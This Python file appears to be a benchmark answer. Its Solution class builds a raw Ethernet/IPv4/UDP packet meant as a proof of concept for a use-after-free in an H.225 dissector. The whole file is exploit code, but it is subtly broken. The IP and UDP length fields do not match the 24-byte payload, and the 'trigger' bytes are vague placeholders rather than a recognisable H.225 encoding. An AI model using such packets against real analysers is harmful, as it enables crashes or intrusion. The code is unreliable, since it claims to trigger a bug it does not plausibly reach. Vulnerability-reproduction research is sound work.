import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct minimal packet triggering the use-after-free
        # Based on vulnerability description in h225 dissector
        
        # Ethernet header (14 bytes): dummy MACs, IPv4 type
        eth = b'\x00' * 12 + b'\x08\x00'
        
        # IPv4 header (20 bytes): minimal valid header
        # Total length: 20 + 8 + 31 = 59 bytes
        ip = (
            b'\x45\x00' +           # Version/IHL, DSCP/ECN
            struct.pack('>H', 59) + # Total length
            b'\x00\x00\x40\x00' +   # ID, Flags/Fragment
            b'\x40\x11\x00\x00' +   # TTL, Protocol=UDP, Checksum=0
            b'\x7f\x00\x00\x01' +   # Source IP: 127.0.0.1
            b'\x7f\x00\x00\x01'     # Dest IP: 127.0.0.1
        )
        
        # UDP header (8 bytes): arbitrary ports, length=31
        udp = (
            b'\x04\x00\x04\x01' +   # Source/dest ports
            struct.pack('>H', 31) + # Length
            b'\x00\x00'             # Checksum
        )
        
        # H.225 RAS Message triggering the bug:
        # Sequence causing dissector to re-enter without proper initialization
        ras = (
            b'\x00\x00\x00\x1b' +   # Length prefix
            b'\x00\x01' +           # Message type
            b'\x00\x00\x00\x00' +   # Request ID
            b'\x00' * 3 +           # Padding
            b'\x05' +               # Trigger specific code path
            b'\x00' * 10            # Additional data
        )
        
        poc = eth + ip + udp + ras
        return poc